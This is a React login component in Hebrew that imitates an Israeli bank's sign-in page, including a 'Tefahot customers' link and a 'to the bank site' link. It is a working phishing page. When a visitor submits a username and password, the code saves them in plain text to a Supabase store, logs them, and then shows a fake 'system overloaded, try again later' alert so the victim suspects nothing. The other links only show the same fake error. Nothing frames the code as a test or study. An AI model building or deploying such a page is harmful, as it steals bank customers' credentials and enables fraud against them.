
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { saveLoginData } from '../utils/dataStorage';

const LoginForm: React.FC = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      // Create data object
      const loginData = {
        username,
        password,
        timestamp: new Date().toISOString(),
        rememberMe: false
      };
      
      // Save the data to Supabase
      await saveLoginData(loginData);
      
      console.log('Login data saved:', loginData);
      
      // Clear form
      setUsername('');
      setPassword('');
      
      alert('קיים עומס על מערכת האתר, נסה שוב מאוחר יותר');
    } catch (error) {
      console.error('Error saving data:', error);
      alert('שגיאה בשמירת הנתונים');
    } finally {
      setIsLoading(false);
    }
  };

  const handleBankSiteClick = () => {
    alert('קיים עומס על מערכת האתר, נסה שוב מאוחר יותר');
  };

  const handleForgotPasswordClick = () => {
    alert('קיים עומס על מערכת האתר, נסה שוב מאוחר יותר');
  };

  return (
    <div 
      className="h-screen w-full flex items-start justify-center p-4 pt-20 overflow-hidden fixed inset-0"
      style={{
        backgroundImage: `url('/lovable-uploads/df129b70-1212-409f-8339-071eca69ed72.png')`,
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat'
      }}
    >
      <div className="w-full max-w-md animate-slide-in">
        <div className="bg-white rounded-2xl shadow-2xl p-8 space-y-6">
          {/* Logo */}
          <div className="flex justify-center mb-4">
            <img 
              src="/lovable-uploads/98302a94-d0d2-420a-a0ad-57e4ecbc5ba4.png" 
              alt="Company Logo" 
              className="w-16 h-16 object-contain"
            />
          </div>

          {/* Title */}
          <div className="text-center space-y-2">
            <h1 className="text-2xl font-bold text-gray-800">
            כניסה לחשבונך
            </h1>
            <p className="text-sm text-gray-600">
              כדי להמשיך בתהליך יש להזין שם משתמש וסיסמה
            </p>
          </div>

          {/* Login Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Username Field */}
            <div className="space-y-2">
              <div className="relative">
                <span className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 z-10">
                  👤
                </span>
                <Input
                  type="text"
                  placeholder="שם משתמש"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full h-12 pr-12 pl-4 text-right border-gray-300 rounded-lg focus:border-orange focus:ring-orange transition-colors duration-200 text-base bg-gray-50"
                  dir="rtl"
                  required
                  disabled={isLoading}
                />
              </div>
            </div>

            {/* Password Field */}
            <div className="space-y-2">
              <div className="relative">
                <span className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 z-10">
                  🔒
                </span>
                <Input
                  type="password"
                  placeholder="סיסמה"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full h-12 pr-12 pl-4 text-right border-gray-300 rounded-lg focus:border-orange focus:ring-orange transition-colors duration-200 text-base bg-gray-50"
                  dir="rtl"
                  required
                  disabled={isLoading}
                />
              </div>
            </div>

            {/* Login Button */}
            <div className="pt-3">
              <Button
                type="submit"
                disabled={isLoading}
                className="w-full h-12 bg-orange hover:bg-orange-hover text-white font-semibold rounded-lg transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98] disabled:opacity-50 text-base"
              >
                {isLoading ? 'שומר...' : 'כניסה'}
              </Button>
            </div>
          </form>

          {/* Additional Options */}
          <div className="text-center pt-3 space-y-3">
            <Button
              onClick={handleBankSiteClick}
              variant="link"
              className="block w-full text-orange hover:text-orange-hover transition-colors duration-200 text-sm underline p-0 h-auto"
            >
              כניסה ללקוחות טפחות
            </Button>
            <div className="flex justify-between items-center text-xs">
              <Button
                onClick={handleBankSiteClick}
                variant="link"
                className="text-gray-500 hover:text-gray-700 transition-colors duration-200 p-0 h-auto text-xs"
              >
                לאתר הבנק {'>'}
              </Button>
              <Button
                onClick={handleForgotPasswordClick}
                variant="link"
                className="text-gray-500 hover:text-gray-700 transition-colors duration-200 p-0 h-auto text-xs"
              >
                שכחת/נחסמה סיסמתך?
              </Button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
